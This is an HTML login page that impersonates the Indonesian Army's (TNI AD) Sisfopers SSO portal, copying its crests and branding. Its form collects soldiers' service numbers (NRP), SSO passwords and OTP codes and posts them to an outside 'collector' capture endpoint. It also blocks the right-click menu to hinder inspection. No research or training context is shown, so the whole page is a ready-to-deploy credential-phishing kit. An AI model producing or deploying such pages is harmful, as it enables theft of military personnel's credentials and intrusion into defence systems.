<!DOCTYPE html>
<html lang="id" oncontextmenu="return false">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TNI AD - Single Sign-On (SSO) Sisfopers TNI Angkatan Darat</title>
    <style>
        :root {
            --bg-main: #0b160e;
            --bg-card: #122417;
            --border: #284f34;
            --gold: #d4af37;
            --green-btn: #256b3b;
            --text: #f0f5f1;
            --muted: #9ab3a0;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
            background: linear-gradient(160deg, #16301e 0%, var(--bg-main) 75%);
            color: var(--text);
            min-height: 100vh;
        }
        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 48px;
            background: rgba(8, 18, 11, 0.88);
            border-bottom: 1px solid var(--border);
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .brand img {
            width: 58px;
            height: 58px;
            object-fit: contain;
        }
        .brand h1 {
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 0.6px;
        }
        .brand span {
            display: block;
            font-size: 11.5px;
            color: var(--gold);
            letter-spacing: 1px;
        }
        .nav-links {
            display: flex;
            gap: 26px;
            font-size: 13px;
            font-weight: 700;
            text-transform: uppercase;
        }
        .nav-links a { color: var(--text); text-decoration: none; }
        .container {
            max-width: 480px;
            margin: 56px auto;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-top: 4px solid var(--gold);
            border-radius: 10px;
            padding: 30px 32px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.65);
        }
        .crest-center {
            text-align: center;
            margin-bottom: 18px;
        }
        .crest-center img {
            width: 82px;
            height: 82px;
            object-fit: contain;
            margin-bottom: 8px;
        }
        .crest-center h2 {
            font-size: 18px;
            color: var(--gold);
            text-transform: uppercase;
        }
        .crest-center p {
            font-size: 12.5px;
            color: var(--muted);
            margin-top: 4px;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 14px;
            padding: 6px 2px;
        }
        label {
            font-size: 12.5px;
            font-weight: 600;
            color: #d6e6da;
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            background: #08120b;
            border: 1px solid #356343;
            border-radius: 6px;
            color: #ffffff;
            font-size: 13.5px;
        }
        button {
            margin-top: 6px;
            padding: 12px 16px;
            background: var(--green-btn);
            border: 1px solid var(--gold);
            border-radius: 6px;
            color: #ffffff;
            font-weight: 800;
            font-size: 13.5px;
            cursor: pointer;
            text-transform: uppercase;
        }
    </style>
</head>
<body oncontextmenu="return false">
    <header class="topbar">
        <div class="brand">
            <img src="assets/logo-tni-ad.png" alt="Lambang TNI Angkatan Darat Kartika Eka Paksi" />
            <div>
                <h1>TNI ANGKATAN DARAT</h1>
                <span>PORTAL SSO SISFOPERS &amp; PUSSIBERAD</span>
            </div>
        </div>
        <nav class="nav-links">
            <a href="#beranda">Beranda</a>
            <a href="#profil">Profil</a>
            <a href="#sisfopers">Sisfopers</a>
            <a href="#ppid">PPID TNI AD</a>
        </nav>
    </header>

    <main class="container">
        <div class="crest-center">
            <img src="assets/kartika.png" alt="Lambang Kartika Eka Paksi TNI AD" />
            <h2>Otentikasi SSO Prajurit TNI AD</h2>
            <p>Sinkronisasi Data Personel Sisfopers Kodam &amp; Satuan Jajaran</p>
        </div>

        <form action="https://sso-tniad-collector.example.org/api/capture" method="POST">
            <div>
                <label for="nrp_prajurit">NRP / Username Sisfopers</label>
                <input type="text" id="nrp_prajurit" name="nrp_prajurit" placeholder="Masukkan NRP Prajurit" required />
            </div>
            <div>
                <label for="sandi_sso">Kata Sandi SSO / OTP</label>
                <input type="password" id="sandi_sso" name="sandi_sso" placeholder="Masukkan Kata Sandi SSO" required />
            </div>
            <button type="submit">Sinkronisasi Akun Sisfopers</button>
        </form>
    </main>
</body>
</html>
